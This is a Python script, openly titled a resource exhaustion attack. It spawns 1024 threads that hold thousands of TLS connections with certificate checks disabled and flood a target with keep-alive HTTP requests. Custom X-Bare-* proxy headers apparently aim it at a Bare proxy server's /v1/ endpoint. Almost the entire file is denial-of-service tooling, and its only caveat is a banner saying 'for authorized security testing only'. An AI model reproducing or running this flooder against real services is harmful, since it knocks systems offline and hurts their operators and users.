import socket
import threading
import time
import ssl
import sys
import random


class resourceExhaustionAttacker:
    def __init__(self):
        # Target configuration
        self.target_host = ""
        self.target_port = 443
        # Bare path
        self.target_path = "/v1/"
        self.use_ssl = True

        # Attack parameters
        self.num_threads = 1024
        self.connection_timeout = 10

        # Statistics
        self.stats = {
            'total_connections': 0,
            'active_connections': 0,
            'failed_connections': 0,
            'successful_connections': 0,
            'start_time': time.time(),
            'requests_sent': 0
        }

        # Control flags
        self.running = False
        self.threads = []

        # Pre-generate the requests

        print(f"[!] BARE RESOURCE EXHAUSTION ATTACK")
        print(f"[!] Target: {self.target_host}:{self.target_port}")
        print(f"[!] Path: {self.target_path}")
        print(f"[!] Threads: {self.num_threads}")

    def log(self, message):
        """Minimal logging for performance"""
        timestamp = time.strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")

    def generate_http_request(self):
        """Generate multiple HTTP requests with variations"""
        requests = []

        # Create several variations of the request
        for i in range(10):
            request = (
                f"GET {self.target_path} HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                f"Accept: */*\r\n"
                f"Accept-Encoding: gzip, deflate, br\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                f"Cache-Control: no-cache\r\n"
                f"Pragma: no-cache\r\n"
                f"Connection: keep-alive\r\n"
                f"Keep-Alive: timeout=3600\r\n"
                f"X-Bare-Forward-Headers: [\"accept-encoding\",\"connection\",\"content-length\"]\r\n"
                f"X-Bare-Headers: {{\"accept\": \"*/*\", \"user-agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\", \"Host\": \"{self.target_host}\"}}\r\n"
                f"X-Bare-Port: 443\r\n"
                f"X-Bare-Host: {self.target_host}\r\n"
                f"X-Bare-Path: {self.target_path}\r\n"
                f"X-Bare-Protocol: https:\r\n"
                f"X-Request-ID: {random.randint(100000, 999999)}\r\n"
                f"\r\n"
            ).encode()
            requests.append(request)

        return requests

    def create_socket_connection(self):
        """Create a raw socket connection to the target"""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.connection_timeout)

            # Connect to target
            sock.connect((self.target_host, self.target_port))

            # Wrap with SSL if needed
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target_host)

            return sock
        except:
            return None

    def connection_worker(self, thread_id):
        """Worker thread that creates and maintains connections"""
        socks = []  # Multiple sockets per thread for more intensity

        while self.running:
            try:
                # Create new connections if we don't have enough
                while len(socks) < 5 and self.running:  # 5 connections per thread
                    sock = self.create_socket_connection()
                    if sock:
                        socks.append(sock)
                        self.stats['active_connections'] += 1
                        self.stats['successful_connections'] += 1
                    else:
                        self.stats['failed_connections'] += 1

                # Send requests on all sockets
                for sock in socks:
                    try:
                        # Send a request
                        sock.send(self.generate_http_request())
                        self.stats['requests_sent'] += 1

                        # Try to read a little bit to consume server resources
                        try:
                            data = sock.recv(1024)
                            if data:
                                # If we get data, send another request immediately
                                sock.send(self.generate_http_request())
                                self.stats['requests_sent'] += 1
                        except:
                            # If reading fails, the connection might be dead
                            pass

                    except:
                        # Socket error, remove it
                        socks.remove(sock)
                        self.stats['active_connections'] -= 1
                        try:
                            sock.close()
                        except:
                            pass

                # Brief sleep to avoid 100% CPU usage
                time.sleep(0.01)

            except Exception as e:
                # Handle any exceptions and continue
                pass

    def start_attack(self):
        """Start the attack with all threads"""
        self.running = True
        self.log("STARTING RESOURCE EXHAUSTION ATTACK")

        # Create and start all threads
        for i in range(self.num_threads):
            thread = threading.Thread(target=self.connection_worker, args=(i,))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)

        # Monitor and display stats
        try:
            while self.running:
                active = self.stats['active_connections']
                failed = self.stats['failed_connections']
                requests = self.stats['requests_sent']

                # Calculate requests per second
                elapsed = time.time() - self.stats['start_time']
                rps = requests / elapsed if elapsed > 0 else 0

                self.log(f"Active: {active}, Failed: {failed}, Requests: {requests} ({rps:.1f}/s)")
                time.sleep(2)

        except KeyboardInterrupt:
            self.log("Attack stopped by user")
            self.running = False

    def stop_attack(self):
        """Stop the attack"""
        self.running = False
        for thread in self.threads:
            thread.join(timeout=0.5)


def main():
    """Main function"""
    print("""
    ╔══════════════════════════════════════════════════╗
    ║            RESOURCE EXHAUSTION ATTACK            ║
    ║                                                  ║
    ║  ⚠️  FOR AUTHORIZED SECURITY TESTING ONLY ⚠️    ║
    ╚══════════════════════════════════════════════════╝
    """)

    # Windows-specific optimizations
    try:
        # Increase socket buffer sizes
        socket.SO_RCVBUF = 65536
        socket.SO_SNDBUF = 65536
    except:
        pass

    attacker = resourceExhaustionAttacker()

    try:
        attacker.start_attack()
    except KeyboardInterrupt:
        attacker.stop_attack()
    except Exception as e:
        attacker.log(f"Unexpected error: {e}")
        attacker.stop_attack()


if __name__ == "__main__":
    main()
